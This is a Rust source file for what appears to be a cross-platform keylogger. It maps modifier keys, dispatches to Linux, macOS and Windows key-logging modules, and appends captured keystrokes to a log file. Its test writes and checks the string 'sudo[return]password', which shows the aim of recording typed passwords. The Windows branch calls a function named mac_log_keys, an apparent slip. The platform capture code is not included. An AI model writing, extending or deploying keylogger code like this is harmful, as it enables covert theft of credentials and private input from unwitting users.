use std::{collections::HashMap, fs::{OpenOptions}, io::Write};
use anyhow::Result;
#[cfg(target_os = "linux")]
mod nix;
#[cfg(target_os = "macos")]
mod mac;
#[cfg(target_os = "windows")]
mod win;

fn set_modifier(key_char: &str, shift: bool, capslock: bool, _ctrl: bool, _option: bool, _func: bool) -> Result<String> {
    let shift_mapping: HashMap<&str, &str> = HashMap::from([
        ("1", "!"),
        ("2", "@"),
        ("3", "#"),
        ("4", "$"),
        ("5", "%"),
        ("6", "^"),
        ("7", "&"),
        ("8", "*"),
        ("9", "("),
        ("0", ")"),
        ("[", "{"),
        ("]", "}"),
        ("/", "?"),
        ("=", "+"),
        ("\\", "|"),
        ("'", "\""),
        (",", "<"),
        (".", ">"),
        ("`", "~"),
        ("-", "_"),
    ]);

    let mut res = key_char.clone().to_string();
    if shift && shift_mapping.contains_key(&key_char) {
        res = shift_mapping[&key_char].to_string();
    } else if shift || capslock {
        res = key_char.to_uppercase();
    }
    Ok(res)
}

fn log_keys_to_disk(captured_keys_buffer: String, log_file: String) -> Result<()> {
    let mut file = OpenOptions::new()
        .append(true)
        .create(true)
        .open(log_file)?;
    
    write!(file, "{}\n", captured_keys_buffer)?;
    Ok(())
}

pub(crate) fn start_eventlistener(log_file: String, timeout: u64) -> Result<()> {
    #[cfg(target_os = "linux")]
    {
        let keyboard_device_path = nix::nix_find_keyboard_device();
        let _res = nix::nix_log_keys(keyboard_device_path.unwrap(), log_file, timeout);    
    }
    #[cfg(target_os = "macos")]
    {
        let _res = mac::mac_log_keys(log_file, timeout);    
    }
    #[cfg(target_os = "windows")]
    {
        let _res = win::mac_log_keys(log_file, timeout);    
    }
    Ok(())
}


#[cfg(test)]
mod tests {
    use std::io::{BufReader, BufRead};

    use super::*;
    use tempfile::NamedTempFile;

    #[test]
    fn test_log_keys_to_disk() -> Result<()> {
        let tmp_file = NamedTempFile::new()?;
        let path = String::from(tmp_file.path().to_str().unwrap());
        let _res = log_keys_to_disk("sudo[return]password".to_string(), path);
        let file_reader = BufReader::new(tmp_file);
        let last_line = file_reader.lines().last().unwrap()?;
        assert!(last_line.contains("sudo[return]password"));
        Ok(())
    }
    #[test]
    fn test_set_modifier() -> Result<()> {
        let mut res = set_modifier(&'c'.to_string(), true, false, false, false, false).unwrap();
        assert_eq!('C'.to_string(), res);
        res = set_modifier(&'-'.to_string(), true, false, false, false, false).unwrap();
        assert_eq!('_'.to_string(), res);
        res = set_modifier(&'a'.to_string(), false, false, false, false, false).unwrap();
        assert_eq!("a".to_string(), res);
        res = set_modifier(&'a'.to_string(), false, true, false, false, false).unwrap();
        assert_eq!("A".to_string(), res);
        Ok(())
    }
    #[test]
    fn test_get_key_hash_map() -> Result<()> {
        Ok(())
    }
}